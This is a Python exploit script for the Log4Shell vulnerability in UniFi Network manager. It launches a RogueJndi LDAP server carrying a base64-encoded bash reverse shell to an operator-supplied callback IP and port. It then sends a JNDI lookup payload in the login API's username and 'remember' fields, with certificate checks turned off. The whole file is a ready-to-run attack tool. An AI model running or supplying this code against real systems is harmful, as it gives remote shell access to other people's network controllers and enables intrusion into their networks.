# ================================================================================
# =                               LOG4SHELL_UNIFI                                =
# ================================================================================

import argparse
import base64
import subprocess
import sys
import time
from pathlib import Path

import requests
import urllib3


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-u",
        "--url",
        action="store",
        help="Base URL for UniFi Network manager.",
        required=True,
        dest="url",
    )
    parser.add_argument(
        "-i",
        "--ip",
        action="store",
        help="Callback IP for reverse shell and LDAP server.",
        required=True,
        dest="ip",
    )
    parser.add_argument(
        "-p",
        "--port",
        action="store",
        help="Callback port for reverse shell.",
        required=True,
        dest="port",
    )
    parser.add_argument(
        "-j",
        "--jar",
        action="store",
        help="Path to RogueJndi-1.1.jar",
        dest="jar",
    )

    return parser.parse_args()


def start_rouge_jndi(args: argparse.Namespace) -> None:
    # Check for RougeJndi jar existence
    if not Path(args.jar).exists():
        print("RougeJndi-1.1.jar not found.", file=sys.stderr)
        print("See README.md for more information", file=sys.stderr)
        sys.exit(1)

    # Base 64 encode revshell
    # b64encode expects bytes so wrap around encode/decode
    revshell = base64.b64encode(
        f"bash -c bash -i >&/dev/tcp/{args.ip}/{args.port} 0>&1".encode("utf-8")
    ).decode("utf-8")

    print("Starting LDAP server")
    subprocess.Popen(
        [
            "timeout",
            "30s",
            "java",
            "-jar",
            args.jar,
            "--command",
            f"bash -c {{echo,{revshell}}}|{{base64,-d}}|{{bash,-i}}",
            "--hostname",
            args.ip,
        ],
        stdout=subprocess.DEVNULL,
    )
    time.sleep(5)  # Wait for server to start


def send_payload(args: argparse.Namespace) -> None:
    payload = f"${{jndi:ldap://{args.ip}:1389/o=tomcat}}"

    print("Sending payload")
    # Pass payload in multiple fields because it changes based on version
    requests.post(
        f"{args.url}/api/login",
        json={
            "username": payload,
            "password": "log4shell",
            "remember": payload,
            "strict": True,
        },
        verify=False,  # Disable SSL certificate verification
    )


def main() -> None:
    urllib3.disable_warnings()
    args = parse_args()
    start_rouge_jndi(args)
    send_payload(args)


if __name__ == "__main__":
    main()
